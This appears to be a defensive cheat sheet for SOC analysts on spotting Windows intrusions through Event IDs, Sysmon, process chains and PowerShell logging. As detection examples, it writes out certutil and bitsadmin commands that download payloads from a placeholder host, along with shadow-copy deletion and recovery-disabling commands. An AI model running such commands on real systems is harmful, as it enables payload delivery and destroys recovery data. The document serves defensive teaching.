# Windows Threat Detection Cheat Sheet

A practical reference for detecting common attacker activity in Windows environments using Windows Event Logs, Sysmon, PowerShell logging, and process monitoring.

The goal of this cheat sheet is to quickly identify useful artifacts during SOC investigations and understand how individual events fit into an attack chain.

---

# 1. Initial Access

## RDP Threats & Brute-Force Detection

Remote Desktop Protocol (RDP) is commonly targeted for external access and lateral movement.

### Important Event IDs

| Event ID | Source | Description | Detection Use |
|---|---|---|---|
| **4624** | Security | Successful Logon | Look for `Logon Type 10` for RDP |
| **4625** | Security | Failed Logon | Repeated failures may indicate brute force or password spraying |
| **4778** | TerminalServices | RDP Session Reconnected | Investigate unexpected session reconnections |
| **4779** | TerminalServices | RDP Session Disconnected | Useful for reconstructing RDP activity |

### Investigation Pattern

Repeated:

```text
4625
4625
4625
4625
```

followed by:

```text
4624
Logon Type: 10
```

may indicate successful access following repeated authentication attempts.

Always correlate:

```text
Source IP
Username
Timestamp
Logon Type
Hostname
```

---

# 2. Phishing & Malicious Documents

Phishing attachments may execute scripts or command interpreters after a user opens a malicious document.

Monitor:

```text
Sysmon Event ID 1
Windows Security Event ID 4688
```

for suspicious parent-child relationships.

### Suspicious Process Chains

| Parent | Child | Possible Indicator |
|---|---|---|
| `WINWORD.EXE` | `powershell.exe` | Malicious macro / document |
| `WINWORD.EXE` | `cmd.exe` | Command execution from document |
| `EXCEL.EXE` | `powershell.exe` | Malicious spreadsheet |
| `OUTLOOK.EXE` | `wscript.exe` | Script attachment |
| `OUTLOOK.EXE` | `cscript.exe` | Script attachment |
| `chrome.exe` | `powershell.exe` | Downloaded payload execution |
| `msedge.exe` | `certutil.exe` | Suspicious download activity |

Example suspicious chain:

```text
WINWORD.EXE
    ↓
powershell.exe
    ↓
payload.exe
```

### PowerShell Indicators

Look for:

```text
-enc
-e
-EncodedCommand
-NoProfile
-WindowStyle Hidden
```

Encoded or hidden PowerShell execution should be investigated together with its parent process and surrounding activity.

---

# 3. USB & Removable Media

Removable media can be used to introduce malicious files into an environment.

| Artifact | Source | Detection Focus |
|---|---|---|
| Device arrival | Partition Diagnostic Event 1006 | Removable device connected |
| Execution from USB | Sysmon 1 | Process launched from removable drive |
| File creation | Sysmon 11 | Suspicious files written from removable media |
| LNK activity | Sysmon 11 / 15 | Shortcut files referencing scripts or executables |

Look for execution paths such as:

```text
D:\
E:\
F:\
```

Example:

```text
E:\payload.exe
```

---

# 4. System & Account Discovery

After gaining access, attackers often enumerate the compromised environment.

Monitor:

```text
Sysmon Event ID 1
Windows Event ID 4688
PowerShell Event ID 4104
```

### Common Discovery Commands

| Technique | Commands |
|---|---|
| User Discovery | `whoami`, `net user` |
| Group Discovery | `net group`, `net localgroup` |
| Network Discovery | `ipconfig /all`, `arp -a`, `netstat -ano` |
| Domain Discovery | `nltest /domain_trusts` |
| Process Discovery | `tasklist`, `Get-Process` |

Individual commands may be legitimate.

The stronger indicator is often a sequence such as:

```text
whoami
ipconfig /all
net user
net group
netstat -ano
```

executed within a short period.

This may indicate automated reconnaissance.

---

# 5. Data Collection & Staging

Before exfiltration, attackers may search for files and move them into a staging directory.

### Common Tools

| Activity | Tool / Command | Detection Focus |
|---|---|---|
| Archive files | `7z.exe` | Creation of compressed archives |
| Archive files | `rar.exe` | Large or unusual archive creation |
| Archive files | `tar.exe` | Bulk file compression |
| Copy files | `robocopy` | Large-scale file copying |
| Copy files | `xcopy` | File staging |
| Search files | `Get-ChildItem` | Recursive search for sensitive files |

Example:

```powershell
Get-ChildItem -Recurse -Include *.txt
```

PowerShell Script Block Logging:

```text
Event ID 4104
```

is particularly useful for detecting PowerShell-based collection.

### Suspicious Staging Locations

Pay attention to archives or collections created in:

```text
C:\Windows\Temp\
C:\Users\Public\
%TEMP%
AppData\Local\Temp\
```

---

# 6. Ingress Tool Transfer

Attackers may download additional tools or payloads after compromising a host.

Common LOLBINs and utilities include:

| Tool | Suspicious Usage |
|---|---|
| `certutil.exe` | Downloading remote files |
| `powershell.exe` | `Invoke-WebRequest` |
| `bitsadmin.exe` | BITS file transfer |

## Certutil

Example:

```powershell
certutil.exe -urlcache -f http://<IP>/payload.exe out.exe
```

Look for:

```text
Sysmon Event ID 1
```

with:

```text
certutil.exe
-urlcache
http
https
```

Also correlate with:

```text
Sysmon Event ID 3 → Network Connection
Sysmon Event ID 11 → File Creation
```

---

## PowerShell

Common download commands:

```powershell
Invoke-WebRequest
```

Short alias:

```powershell
iwr
```

Another method:

```powershell
(New-Object Net.WebClient).DownloadFile()
```

Important log:

```text
PowerShell Event ID 4104
```

---

## BITSAdmin

Example:

```cmd
bitsadmin.exe /transfer job http://<IP>/file.exe C:\path\file.exe
```

Investigate unexpected BITS jobs downloading executables or scripts.

---

# 7. Persistence

Attackers establish persistence to maintain access after reboot or logout.

## Scheduled Tasks

Important Event IDs:

| Event ID | Description |
|---|---|
| **4698** | Scheduled Task Created |
| **4702** | Scheduled Task Updated |

Investigate tasks executing from suspicious locations such as:

```text
AppData
Temp
Users\Public
```

Pay attention to tasks launching:

```text
powershell.exe
cmd.exe
rundll32.exe
wscript.exe
```

---

## Windows Services

Important artifact:

```text
System Event ID 7045
```

indicates service installation.

Also monitor:

```text
Sysmon Event ID 13
```

for registry modifications under:

```text
HKLM\SYSTEM\CurrentControlSet\Services\
```

---

## Registry Run Keys

Important locations:

```text
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

```text
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

Useful Sysmon events:

```text
Event ID 12 → Registry object create/delete
Event ID 13 → Registry value set
```

Unexpected executables or scripts added to these keys should be investigated.

---

## Startup Folder

Important path:

```text
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```

Monitor:

```text
Sysmon Event ID 11
```

for suspicious file creation inside startup directories.

---

# 8. Command and Control (C2)

After compromise, malware may establish outbound communication with attacker-controlled infrastructure.

## Important Telemetry

```text
Sysmon Event ID 3 → Network Connection
Sysmon Event ID 22 → DNS Query
Firewall Logs
Proxy Logs
```

### Suspicious Process + Network Combinations

Pay particular attention when processes such as:

```text
powershell.exe
cmd.exe
rundll32.exe
wscript.exe
cscript.exe
```

make unexpected outbound connections.

Example investigation chain:

```text
rundll32.exe
      ↓
Sysmon Event ID 3
      ↓
External IP
      ↓
Repeated connections
```

---

## Beaconing

C2 malware may contact its server periodically.

Example:

```text
10:00:00 → 185.x.x.x
10:00:30 → 185.x.x.x
10:01:00 → 185.x.x.x
10:01:30 → 185.x.x.x
```

Regular connection intervals can indicate beaconing.

Correlate:

```text
Process
Destination IP
Destination Port
Connection Frequency
DNS Requests
```

---

## DNS Tunneling Indicators

Monitor:

```text
Sysmon Event ID 22
DNS Server Logs
```

Look for:

```text
Large numbers of DNS requests
Unusually long subdomains
Repeated queries to one domain
Unusual DNS query patterns
```

---

# 9. Impact & Ransomware Activity

Attackers may disable recovery mechanisms before encrypting files.

## Shadow Copy Deletion

Commands such as:

```cmd
vssadmin.exe delete shadows /all /quiet
```

or:

```cmd
wmic shadowcopy delete
```

should receive immediate investigation.

Useful telemetry:

```text
Sysmon Event ID 1
Windows Event ID 4688
```

---

## Disable System Recovery

Example:

```cmd
bcdedit /set {default} recoveryenabled No
```

Unexpected execution of:

```text
vssadmin.exe
wmic.exe
bcdedit.exe
```

around other suspicious activity can be an important ransomware indicator.

---

# 10. Core Event IDs

These are especially useful during Windows threat hunting:

| Event ID | Source | Meaning |
|---|---|---|
| **1** | Sysmon | Process Creation |
| **3** | Sysmon | Network Connection |
| **11** | Sysmon | File Creation |
| **12** | Sysmon | Registry Object Create/Delete |
| **13** | Sysmon | Registry Value Set |
| **22** | Sysmon | DNS Query |
| **4104** | PowerShell | Script Block Logging |
| **4624** | Security | Successful Logon |
| **4625** | Security | Failed Logon |
| **4688** | Security | Process Creation |
| **4698** | Security | Scheduled Task Created |
| **4702** | Security | Scheduled Task Updated |
| **4778** | TerminalServices | RDP Session Reconnected |
| **4779** | TerminalServices | RDP Session Disconnected |
| **7045** | System | Service Installed |

---

# 11. Process Investigation

When you find a suspicious process, do not investigate it in isolation.

Pivot through:

```text
Process Name
    ↓
Command Line
    ↓
Parent Process
    ↓
Child Processes
    ↓
User
    ↓
Network Connections
    ↓
Files Created
    ↓
Registry Changes
```

Useful fields:

```text
Image
CommandLine
ParentImage
ProcessId
ParentProcessId
User
IntegrityLevel
DestinationIp
DestinationPort
TargetFilename
```

A single suspicious event is useful.

A connected chain of events is much stronger evidence.

---

# 12. Example Attack Chain

A Windows intrusion may appear as:

```text
Phishing Attachment
        ↓
WINWORD.EXE
        ↓
powershell.exe
        ↓
Payload Download
        ↓
payload.exe
        ↓
Discovery
        ↓
whoami / ipconfig / net user
        ↓
Persistence
        ↓
Scheduled Task / Registry Run Key
        ↓
C2 Connection
        ↓
Data Collection
        ↓
Impact
```

The SOC analyst's goal is to reconstruct this chain from telemetry rather than treating every alert independently.

---

# 13. SOC Investigation Checklist

When investigating suspicious Windows activity, ask:

1. Which user executed the process?
2. What was the full command line?
3. What was the parent process?
4. Which child processes were created?
5. Did the process create or modify files?
6. Did it modify the registry?
7. Did it establish network connections?
8. Which destination IP and port were used?
9. Were PowerShell scripts executed?
10. Was persistence created?
11. Did the attacker perform discovery?
12. Were files collected or staged?
13. Was recovery functionality modified?
14. What happened immediately before and after the event?

---

# 14. Quick Detection Reference

```text
Suspicious logon
    → 4624 / 4625

Process execution
    → Sysmon 1 / Security 4688

PowerShell activity
    → 4104

Network connection
    → Sysmon 3

File creation
    → Sysmon 11

Registry modification
    → Sysmon 12 / 13

DNS query
    → Sysmon 22

Scheduled task
    → 4698 / 4702

Service installation
    → 7045
```

---

## Key Takeaway

Windows threat detection is primarily about correlation.

Instead of asking:

> "Is this single event malicious?"

ask:

> "What happened before and after this event?"

A suspicious process becomes much more meaningful when correlated with authentication activity, PowerShell execution, file creation, registry modifications, and outbound network connections.
